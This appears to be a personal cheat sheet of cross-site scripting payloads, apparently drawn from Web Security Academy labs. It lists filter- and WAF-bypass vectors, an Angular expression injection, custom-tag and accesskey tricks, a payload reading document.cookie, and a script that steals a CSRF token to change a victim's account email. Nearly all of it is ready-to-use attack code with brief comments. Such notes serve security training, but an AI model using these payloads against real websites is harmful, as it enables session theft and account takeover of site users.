---
title: Cross Site Scripting ( XSS )
tags:
  - payload
  - infosec
  - xss
---
1. Unique scripts which used to bypass specify situations
```javascript
onmouseover="alert('xss')
"><svg onload="alert('xss')">
<img src=# onerror='alert(1)'>
javascript:alert('xss')
'-alert(document.domain)-'
';alert(document.domain)//
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

2. DOM XSS with Angular expression
```javascript
{{constructor.constructor('alert(1)')()}}
```

3. Arithmetic operator with JS –> Cause Reflected DOM XSS
```javascript
\"-alert(1)}//
```

4. Stored DOM XSS bypass the encode bracket
```javascript
<><img src=1 onerror=alert(1)>
```

5. Script for executing CSRF Form for XSS by using token CSRF
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

6. Tip for causing XSS with block by WAF (web applications firewall)
- Brute force to find the tag can available
- Try to execute attribute with tag available
- And force the website do the event –> Execute the XSS  
	Example: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

7. If on situation the server block all of tag can inject into the code –> we need to create them own like `<xss>`
```javascript
<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x
```

8. Payload can help you filter xss via press event by key button to causing the reflect
```javascript
%27accesskey=%27x%27onclick=%27alert(1)
```

9. If some case study like they add black splash `/` after you input that with quote so with causing reflect xss using close tag for `</script>` for ignore that situation and after that causing payload
```javascript
<\script><script>alert(1)<\script>
```
